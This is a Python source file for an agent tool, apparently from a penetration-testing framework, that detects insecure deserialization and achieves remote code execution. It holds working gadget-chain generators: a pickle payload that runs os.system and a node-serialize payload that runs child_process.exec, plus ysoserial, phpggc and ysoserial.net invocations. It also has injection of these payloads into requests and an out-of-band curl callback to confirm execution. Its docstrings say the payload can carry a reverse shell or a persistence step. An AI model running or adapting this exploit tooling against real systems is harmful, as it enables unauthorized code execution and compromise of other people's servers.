"""deserial_exploit — detect insecure deserialization and prove RCE via gadget chains.

Insecure deserialization is invisible to reflection-based fuzzers: the sink runs
attacker-controlled object graphs, not attacker-controlled strings, so a normal
injection probe never sees it. This tool does the operator's job end to end:

1. **Fingerprint** a captured blob (cookie / param / header / body) — Java
   (``rO0``/``\\xac\\xed``), Python pickle (``\\x80`` opcodes / ``gASV``), PHP
   (``O:``/``a:``), .NET BinaryFormatter + ViewState (``AAEAAAD/////``), Ruby
   Marshal (``\\x04\\x08``), Node ``node-serialize`` (``_$$ND_FUNC$$_``).
2. **Weaponize** a gadget chain that runs an arbitrary command. Node and Python
   are generated natively (no external tool). Java / PHP / .NET / Ruby shell out
   to the standard generators (``ysoserial``, ``phpggc``, ``ysoserial.net``) when
   present in the sandbox, and the ready-to-run command is always returned so the
   operator can generate the payload by hand if the binary is missing.
3. **Deliver + confirm** by replaying the payload into the injection point and
   proving execution out-of-band: a blind ``sleep`` time-delay oracle (default,
   works with zero infra) and/or an OAST callback when an ``oast_domain`` is given.

The command is operator-supplied and wrapped verbatim, so the same primitive
covers a benign ``id`` confirm, a reverse shell, or a persistence step — the
aggression is whatever command you pass. Only run against authorized targets.
"""

from __future__ import annotations

import asyncio
import base64
import binascii
import json
import pickle  # nosec B403 (we generate payloads for exploitation; never unpickle input)
import shutil
import subprocess
import time
from typing import TYPE_CHECKING, Any
from urllib.parse import quote, urlencode, urlparse, urlunparse

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl
from strix.tools.oast.client import get_domain as _oast_get_domain
from strix.tools.oast.client import poll as _oast_poll


if TYPE_CHECKING:
    from collections.abc import Callable

# Blind time-delay oracle: the payload sleeps this long; a real hit shows up as
# response latency this much above the benign baseline.
_SLEEP_SECONDS = 8
_DELAY_THRESHOLD_MS = 6000

# ysoserial default gadget — CommonsCollections is the most widely present chain;
# operators override via ``java_gadget`` when they know the classpath.
_DEFAULT_JAVA_GADGET = "CommonsCollections6"
_DEFAULT_PHP_GADGET = "Laravel/RCE9"
_DEFAULT_DOTNET_GADGET = "TypeConfuseDelegate"


# --------------------------------------------------------------------------- #
# Fingerprinting                                                              #
# --------------------------------------------------------------------------- #


def _decode_candidate(blob: str) -> bytes:
    """Best-effort decode of a captured value to raw bytes for magic-byte checks."""
    s = blob.strip()
    # URL-decoded base64 is the common wire form for cookies / ViewState.
    for variant in (s, s.replace("%3D", "=").replace("%2B", "+").replace("%2F", "/")):
        try:
            return base64.b64decode(variant, validate=False)
        except (binascii.Error, ValueError):
            continue
    return s.encode("utf-8", "replace")


def fingerprint(blob: str) -> list[str]:
    """Return the serialization formats a blob looks like (most-likely first)."""
    if not blob or not blob.strip():
        return []
    s = blob.strip()
    raw = _decode_candidate(s)
    hits: list[str] = []
    # Node node-serialize — the function marker survives base64 or shows raw.
    if "_$$ND_FUNC$$_" in s or b"_$$ND_FUNC$$_" in raw:
        hits.append("node")
    # Java: raw stream magic 0xACED0005, or its base64 prefix "rO0".
    if raw[:2] == b"\xac\xed" or s.startswith("rO0"):
        hits.append("java")
    # Python pickle: protocol-2+ opener 0x80, or base64 prefix "gAS"/"gASV".
    if raw[:1] == b"\x80" or s.startswith(("gAS", "gASV")):
        hits.append("python")
    # .NET BinaryFormatter header 00 01 00 00 00 FF FF FF FF; base64 "AAEAAAD/////".
    if raw[:9] == b"\x00\x01\x00\x00\x00\xff\xff\xff\xff" or s.startswith("AAEAAAD/////"):
        hits.append("dotnet")
    # Ruby Marshal version header 0x0408.
    if raw[:2] == b"\x04\x08":
        hits.append("ruby")
    # PHP serialize object/array: O:<len>:"Class" or a:<len>:{
    if s[:2] in ("O:", "a:") or (raw[:2] in (b"O:", b"a:")):
        hits.append("php")
    return hits


# --------------------------------------------------------------------------- #
# Gadget generation                                                           #
# --------------------------------------------------------------------------- #


class _PickleRCE:
    """__reduce__ makes pickle.loads run os.system(cmd) on the target."""

    def __init__(self, cmd: str) -> None:
        self._cmd = cmd

    def __reduce__(self) -> tuple[Callable[..., Any], tuple[str]]:
        import os  # noqa: PLC0415 (must resolve in the *victim* interpreter)

        return (os.system, (self._cmd,))


def _gen_python(cmd: str) -> bytes:
    return pickle.dumps(_PickleRCE(cmd))


def _gen_node(cmd: str) -> bytes:
    # node-serialize (CVE-2017-5941): the trailing IIFE fires on unserialize().
    esc = cmd.replace("\\", "\\\\").replace("'", "\\'")
    fn = f"_$$ND_FUNC$$_function(){{require('child_process').exec('{esc}')}}()"
    return json.dumps({"rce": fn}).encode("utf-8")


def _external_cmd(fmt: str, cmd: str, gadget: str | None) -> tuple[str, list[str] | None]:
    """Return (ready-to-run command string, argv if the binary is present)."""
    if fmt == "java":
        g = gadget or _DEFAULT_JAVA_GADGET
        argv = ["ysoserial", g, cmd]
        pretty = f"ysoserial {g} {cmd!r}"
    elif fmt == "php":
        g = gadget or _DEFAULT_PHP_GADGET
        argv = ["phpggc", g, "system", cmd]
        pretty = f"phpggc {g} system {cmd!r}"
    elif fmt == "dotnet":
        g = gadget or _DEFAULT_DOTNET_GADGET
        argv = ["ysoserial.net", "-g", g, "-f", "BinaryFormatter", "-c", cmd]
        pretty = f"ysoserial.net -g {g} -f BinaryFormatter -c {cmd!r}"
    elif fmt == "ruby":
        # universal deserialization gadget generator (rce-gadget style)
        argv = None
        pretty = (
            f"# Ruby Marshal RCE needs a target-version gadget; "
            f"e.g. a universal_pop chain for {cmd!r}"
        )
    else:
        return ("", None)
    if argv and shutil.which(argv[0]):
        return (pretty, argv)
    return (pretty, None)


def _run_external(argv: list[str], timeout: int) -> bytes | None:
    try:
        proc = subprocess.run(  # noqa: S603
            argv, capture_output=True, timeout=max(timeout, 30), check=False
        )
    except (OSError, subprocess.SubprocessError):
        return None
    return proc.stdout or None


def build_payload(fmt: str, cmd: str, gadget: str | None, timeout: int) -> dict[str, Any]:
    """Return {raw bytes | None, note, generator}."""
    if fmt == "python":
        raw = _gen_python(cmd)
        return {"raw": raw, "note": "native pickle __reduce__ gadget", "generator": "native"}
    if fmt == "node":
        raw = _gen_node(cmd)
        return {"raw": raw, "note": "native node-serialize IIFE gadget", "generator": "native"}
    pretty, argv = _external_cmd(fmt, cmd, gadget)
    if argv:
        ext_raw = _run_external(argv, timeout)
        if ext_raw:
            return {"raw": ext_raw, "note": f"generated via `{argv[0]}`", "generator": pretty}
    return {
        "raw": None,
        "note": f"no native generator for {fmt}; run this to produce the payload",
        "generator": pretty,
    }


# --------------------------------------------------------------------------- #
# Delivery + confirmation                                                     #
# --------------------------------------------------------------------------- #


def _encode(raw: bytes, encoding: str) -> str:
    if encoding == "raw":
        return raw.decode("latin-1")
    b64 = base64.b64encode(raw).decode("ascii")
    return quote(b64, safe="") if encoding == "url" else b64


def _place(
    where: str,
    name: str,
    value: str,
    url: str,
    headers: dict[str, str] | None,
    body: str | None,
) -> tuple[str, dict[str, str], str | None]:
    """Inject ``value`` into the chosen request location. Returns (url, headers, body)."""
    hdrs = dict(headers or {})
    if where == "cookie":
        existing = hdrs.get("Cookie", "")
        hdrs["Cookie"] = f"{existing}; {name}={value}".lstrip("; ")
        return url, hdrs, body
    if where == "header":
        hdrs[name] = value
        return url, hdrs, body
    if where == "query":
        parsed = urlparse(url)
        q = parsed.query
        pair = urlencode({name: value})
        parsed = parsed._replace(query=f"{q}&{pair}" if q else pair)
        return urlunparse(parsed), hdrs, body
    # body: either the raw payload, or substituted into a {PAYLOAD} placeholder.
    if body and "{PAYLOAD}" in body:
        return url, hdrs, body.replace("{PAYLOAD}", value)
    return url, hdrs, value


def _deliver(
    where: str,
    name: str,
    value: str,
    url: str,
    method: str,
    headers: dict[str, str] | None,
    body: str | None,
    timeout: int,
) -> dict[str, Any]:
    u, h, b = _place(where, name, value, url, headers, body)
    return _replay_impl(method, u, h, b, timeout + _SLEEP_SECONDS + 5, allow_redirects=False)


def _confirm(
    fmt: str,
    where: str,
    name: str,
    encoding: str,
    url: str,
    method: str,
    headers: dict[str, str] | None,
    body: str | None,
    gadget: str | None,
    oast_domain: str | None,
    timeout: int,
) -> dict[str, Any]:
    result: dict[str, Any] = {"format": fmt, "confirmed": False, "oracle": None}

    # 1) OAST oracle (out-of-band, survives blind sinks with no timing signal).
    if oast_domain:
        oast_cmd = f"curl -s http://{oast_domain}/ || nslookup {oast_domain}"
        built = build_payload(fmt, oast_cmd, gadget, timeout)
        result["oast_generator"] = built["generator"]
        if built["raw"] is not None:
            _deliver(
                where,
                name,
                _encode(built["raw"], encoding),
                url,
                method,
                headers,
                body,
                timeout,
            )
            time.sleep(3)
            poll = _oast_poll()
            if poll.get("got_callback"):
                result.update(confirmed=True, oracle="oast", oast=poll.get("interactions"))
                return result

    # 2) Blind time-delay oracle (default; zero infra).
    baseline = _deliver(
        where, name, _encode(b"benign-baseline", encoding), url, method, headers, body, timeout
    )
    sleep_built = build_payload(fmt, f"sleep {_SLEEP_SECONDS}", gadget, timeout)
    result["generator"] = sleep_built["generator"]
    result["note"] = sleep_built["note"]
    if sleep_built["raw"] is None:
        result["payload_b64"] = None
        return result
    payload_val = _encode(sleep_built["raw"], encoding)
    result["payload_b64"] = base64.b64encode(sleep_built["raw"]).decode("ascii")
    delayed = _deliver(where, name, payload_val, url, method, headers, body, timeout)
    base_ms = baseline.get("elapsed_ms") or 0
    hit_ms = delayed.get("elapsed_ms") or 0
    result["baseline_ms"] = base_ms
    result["payload_ms"] = hit_ms
    if (
        baseline.get("success")
        and delayed.get("success")
        and hit_ms - base_ms >= _DELAY_THRESHOLD_MS
    ):
        result.update(confirmed=True, oracle="time-delay")
    return result


def _deserial_impl(
    url: str,
    where: str,
    name: str,
    sample: str | None,
    command: str | None,
    formats: list[str] | None,
    method: str,
    headers: dict[str, str] | None,
    body: str | None,
    encoding: str,
    java_gadget: str | None,
    oast_domain: str,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}

    detected = fingerprint(sample) if sample else []
    targets = formats or detected or ["java", "python", "node", "php", "dotnet", "ruby"]

    oast = oast_domain.strip() or None
    if oast_domain == "auto":
        got = _oast_get_domain()
        oast = got.get("domain") if got.get("success") else None

    findings: list[dict[str, Any]] = []
    for fmt in targets:
        # Confirmation always uses safe oracle commands (sleep / OAST curl).
        conf = _confirm(
            fmt,
            where,
            name,
            encoding,
            url,
            method,
            headers,
            body,
            java_gadget,
            oast,
            timeout,
        )
        # When the operator supplies a real command, hand back the weaponized
        # payload for that command (delivery of it is the operator's call).
        if command:
            weap = build_payload(fmt, command, java_gadget, timeout)
            conf["weaponized_b64"] = (
                base64.b64encode(weap["raw"]).decode("ascii") if weap["raw"] is not None else None
            )
            conf["weaponized_generator"] = weap["generator"]
        findings.append(conf)

    confirmed = [f for f in findings if f["confirmed"]]
    return {
        "success": True,
        "url": url,
        "detected_from_sample": detected,
        "formats_tested": targets,
        "oast_domain": oast,
        "vulnerable": bool(confirmed),
        "confirmed_formats": [f["format"] for f in confirmed],
        "findings": findings,
    }


@function_tool(timeout=900, strict_mode=False)
async def deserial_exploit(
    ctx: RunContextWrapper,
    url: str,
    where: str = "cookie",
    name: str = "session",
    sample: str | None = None,
    command: str | None = None,
    formats: list[str] | None = None,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    encoding: str = "base64",
    java_gadget: str | None = None,
    oast_domain: str = "auto",
    timeout: int = 15,
) -> str:
    """Detect insecure deserialization and prove RCE with a gadget chain.

    Confirmation uses safe out-of-band oracles only: a blind ``sleep`` time-delay
    (default) and an OAST callback when available — no target mutation. Set
    ``command`` to also get back a payload weaponized for *your* command (reverse
    shell, persistence, etc.); delivering that is your call. Only test authorized
    targets.

    Returns JSON with ``vulnerable``, ``confirmed_formats``, and per-format
    ``oracle`` / ``payload_b64`` / ``generator`` (+ ``weaponized_b64`` when
    ``command`` is set).

    Args:
        url: Target URL that consumes the serialized value.
        where: Injection point — ``cookie`` (default), ``header``, ``query`` or ``body``.
        name: Cookie/header/param name to carry the payload (ignored for raw body).
        sample: A captured serialized value to fingerprint (base64 or raw); optional.
        command: OS command to weaponize a payload for (confirmation never uses it).
        formats: Restrict to these formats (java/python/node/php/dotnet/ruby); default auto-detect.
        method: HTTP method (default GET).
        headers: Extra request headers (e.g. auth).
        body: Raw body; use ``{PAYLOAD}`` as a placeholder, else the payload is the body.
        encoding: ``base64`` (default), ``url`` (url-safe base64) or ``raw`` bytes.
        java_gadget: Override the ysoserial/phpggc/ysoserial.net gadget name.
        oast_domain: ``auto`` (default) to mint one, a host to reuse, or ``""`` for time-delay only.
        timeout: Base per-request timeout in seconds (default 15).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _deserial_impl,
            url,
            where,
            name,
            sample,
            command,
            formats,
            method,
            headers,
            body,
            encoding,
            java_gadget,
            oast_domain,
            timeout,
        ),
        ensure_ascii=False,
        default=str,
    )
